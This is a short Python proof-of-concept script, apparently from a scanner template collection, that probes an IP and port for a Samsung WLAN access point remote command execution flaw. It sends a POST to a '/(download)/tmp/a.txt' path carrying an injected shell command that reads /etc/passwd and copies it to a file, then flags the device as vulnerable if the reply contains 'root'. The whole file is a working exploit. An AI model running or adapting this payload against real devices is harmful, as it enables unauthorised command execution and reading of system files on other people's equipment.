
#encoding:utf-8
try:
    import requests,os,sys,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "http://" + ip + ":" + port
    payload = "/(download)/tmp/a.txt"                                #填写payload
    header = {
            "Connection": "close",
            "Content-Length": "48"
            }                                 #填写header头
    data = "command1=shell:cat /etc/passwd| dd of=/tmp/a.txt"                                   #填写data数据
    try:
        req = requests.post(url=target+payload,headers=header,data=data,timeout=3,verify=False,allow_redirects=False)

        if req.status_code == 200:
            if (b'root' in req.text) :              #填写判断条件
                logging.info("[+] {} find Samsung_WLAN_AP_RCE".format(ip))                          #填写漏洞名
                os._exit(1)

        logging.info("[-] {} do not found Samsung_WLAN_AP_RCE".format(ip))                          #填写漏洞名
        os._exit(2)
    except Exception as e:
        logging.info("[*] timeout")
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)